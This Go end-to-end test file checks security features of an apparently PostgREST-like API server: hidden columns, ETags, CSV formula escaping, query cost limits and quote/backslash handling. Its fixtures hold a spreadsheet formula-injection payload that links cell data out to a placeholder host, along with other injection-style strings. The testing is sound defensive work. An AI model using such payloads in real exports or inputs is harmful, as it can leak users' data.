package e2e

import (
	"context"
	"net/http"
	"os"
	"regexp"
	"strconv"
	"strings"
	"testing"

	"github.com/jackc/pgx/v5"

	"github.com/suprbdev/pdbr/internal/config"
)

// secFixture creates the sec_ tables (smart-comment hidden columns, CSV
// formula cells, an identifier with a quote and a backslash) and drops them
// at the end of the test. It returns a connection for direct writes.
func secFixture(t *testing.T) *pgx.Conn {
	t.Helper()
	url := os.Getenv("PDBR_TEST_DATABASE_URL")
	if url == "" {
		t.Skip("PDBR_TEST_DATABASE_URL not set; run `make test-e2e`")
	}
	ctx := context.Background()
	conn, err := pgx.Connect(ctx, url)
	if err != nil {
		t.Fatal(err)
	}
	drop := func() {
		for _, ddl := range []string{
			`DROP TABLE IF EXISTS public.sec_secrets`,
			`DROP TABLE IF EXISTS public.sec_cells`,
		} {
			if _, err := conn.Exec(ctx, ddl); err != nil {
				t.Errorf("sec fixture cleanup: %v", err)
			}
		}
	}
	drop()
	t.Cleanup(func() {
		drop()
		conn.Close(ctx)
	})
	for _, ddl := range []string{
		`CREATE TABLE public.sec_secrets (
		    id       integer GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
		    name     text NOT NULL,
		    pin      text,
		    is_admin boolean NOT NULL DEFAULT false)`,
		`COMMENT ON COLUMN public.sec_secrets.pin IS '@omit'`,
		`COMMENT ON COLUMN public.sec_secrets.is_admin IS '@omit read'`,
		`INSERT INTO public.sec_secrets (name, pin, is_admin) VALUES ('a', '4821', true)`,
		`CREATE TABLE public.sec_cells (
		    id          integer PRIMARY KEY,
		    label       text,
		    n           integer,
		    "it's\odd"  text)`,
		`INSERT INTO public.sec_cells VALUES
		    (1, '=HYPERLINK("https://example.invalid/?"&A2,"click")', -5, 'x\y'),
		    (2, '-5', 3, NULL),
		    (3, '@SUM(1+1)', NULL, NULL),
		    (4, 'plain', 0, NULL)`,
	} {
		if _, err := conn.Exec(ctx, ddl); err != nil {
			t.Fatalf("sec fixture: %v\n%s", err, ddl)
		}
	}
	return conn
}

func TestETagIgnoresHiddenColumns(t *testing.T) {
	conn := secFixture(t)
	ctx := context.Background()
	srv := testServer(t, nil).URL
	var one row
	res := getJSON(t, srv+"/api/sec_secrets/1", &one)
	if len(one) != 2 || one["name"] != "a" {
		t.Fatalf("row = %v (pin and is_admin are hidden)", one)
	}
	etag := res.Header.Get("ETag")
	if etag == "" {
		t.Fatal("no ETag")
	}
	for _, upd := range []string{`UPDATE public.sec_secrets SET pin = '0000'`, `UPDATE public.sec_secrets SET is_admin = false`} {
		if _, err := conn.Exec(ctx, upd); err != nil {
			t.Fatal(err)
		}
		if got := getJSON(t, srv+"/api/sec_secrets/1", &one).Header.Get("ETag"); got != etag {
			t.Errorf("%s changed the ETag: %s -> %s", upd, etag, got)
		}
	}
	res, body := do(t, "GET", srv+"/api/sec_secrets/1", map[string]string{"If-None-Match": etag})
	if res.StatusCode != http.StatusNotModified {
		t.Errorf("If-None-Match after a hidden change = %d %s", res.StatusCode, body)
	}
	res, body = send(t, "PATCH", srv+"/api/sec_secrets/1", `{"name":"b"}`, map[string]string{"If-Match": etag})
	if res.StatusCode != http.StatusOK {
		t.Fatalf("If-Match with the current ETag = %d %s", res.StatusCode, body)
	}
	next := getJSON(t, srv+"/api/sec_secrets/1", &one).Header.Get("ETag")
	if next == etag {
		t.Error("ETag unchanged after a visible change")
	}
	res, body = send(t, "PATCH", srv+"/api/sec_secrets/1", `{"name":"c"}`, map[string]string{"If-Match": etag})
	wantProblem(t, res, body, http.StatusPreconditionFailed, "etag_mismatch")
}

func TestCSVFormulaEscaping(t *testing.T) {
	secFixture(t)
	accept := map[string]string{"Accept": "text/csv"}
	const q = "/api/sec_cells?select=id,label,n,%3Dx:id&order=id"
	srv := testServer(t, nil).URL
	res, body := do(t, "GET", srv+q, accept)
	if res.StatusCode != http.StatusOK {
		t.Fatalf("csv = %d %s", res.StatusCode, body)
	}
	got := csvRows(t, body)
	want := [][]string{
		{"id", "label", "n", "'=x"},
		{"1", `'=HYPERLINK("https://example.invalid/?"&A2,"click")`, "-5", "1"},
		{"2", "'-5", "3", "2"},
		{"3", "'@SUM(1+1)", "", "3"},
		{"4", "plain", "0", "4"},
	}
	if !equalRows(got, want) {
		t.Errorf("escaped csv = %q, want %q", got, want)
	}
	raw := testServer(t, func(c *config.Config) { c.Server.CSVEscapeFormulas = false }).URL
	_, body = do(t, "GET", raw+q, accept)
	got = csvRows(t, body)
	if got[0][3] != "=x" || got[1][1] != `=HYPERLINK("https://example.invalid/?"&A2,"click")` || got[2][1] != "-5" {
		t.Errorf("raw csv = %q", got)
	}
}

func equalRows(a, b [][]string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if strings.Join(a[i], "\x00") != strings.Join(b[i], "\x00") {
			return false
		}
	}
	return true
}

var costRE = regexp.MustCompile(`request cost (\d+) exceeds`)

func TestCostCountsLimitlessEmbedsAtPageSize(t *testing.T) {
	srv := testServer(t, nil).URL
	cost := func(q string) int {
		t.Helper()
		res, body := get(t, srv+"/api/"+q)
		wantProblem(t, res, body, http.StatusBadRequest, "cost_exceeded")
		m := costRE.FindSubmatch(body)
		if m == nil {
			t.Fatalf("no cost in %s", body)
		}
		n, _ := strconv.Atoi(string(m[1]))
		return n
	}
	limitless := cost("users?select=id,posts(id,comments(id))")
	explicit := cost("users?select=id,posts(id,comments(id))&posts.limit=100&posts.comments.limit=100")
	if limitless < explicit {
		t.Errorf("limitless cost %d < cost %d with limit=max_page_size", limitless, explicit)
	}
	var rows []row
	getJSON(t, srv+"/api/users?select=id,posts(id,title)&order=id", &rows)
	if len(rows) != 3 {
		t.Errorf("one limitless embed level = %v", rows)
	}
}

// TestNonConformingStrings boots pdbr on connections with
// standard_conforming_strings off (PostgreSQL 19 no longer allows it, so
// the test skips there): request-supplied response keys are bind
// parameters and catalog names with a backslash are escape strings, so
// neither a quote nor a backslash can end a literal early.
func TestNonConformingStrings(t *testing.T) {
	secFixture(t)
	base := os.Getenv("PDBR_TEST_DATABASE_URL")
	sep := "?"
	if strings.Contains(base, "?") {
		sep = "&"
	}
	url := base + sep + "options=-c%20standard_conforming_strings%3Doff"
	ctx := context.Background()
	conn, err := pgx.Connect(ctx, url)
	if err != nil {
		t.Skipf("standard_conforming_strings=off rejected: %v", err)
	}
	var scs string
	err = conn.QueryRow(ctx, `SHOW standard_conforming_strings`).Scan(&scs)
	conn.Close(ctx)
	if err != nil {
		t.Fatal(err)
	}
	if scs != "off" {
		t.Skipf("standard_conforming_strings = %s; this server cannot turn it off", scs)
	}
	srv := testServer(t, func(c *config.Config) { c.Database.URL = url }).URL
	var rows []row
	getJSON(t, srv+"/api/users?select=a%27b%5C:id,c%5C:posts(id),d%5C%27:settings-%3Ea&id=eq.1", &rows)
	if len(rows) != 1 || rows[0][`a'b\`] != float64(1) || rows[0][`c\`] == nil || len(rows[0]) != 3 {
		t.Errorf("aliased row = %v", rows)
	}
	if _, ok := rows[0][`d\'`]; !ok {
		t.Errorf("path alias missing: %v", rows)
	}
	getJSON(t, srv+"/api/sec_cells?id=eq.1", &rows)
	if len(rows) != 1 || rows[0][`it's\odd`] != `x\y` {
		t.Errorf("backslash column = %v", rows)
	}
	var one row
	res := getJSON(t, srv+"/api/sec_cells/1?select=id", &one)
	if res.Header.Get("ETag") == "" || one["id"] != float64(1) {
		t.Errorf("row = %v %v", one, res.Header)
	}
}
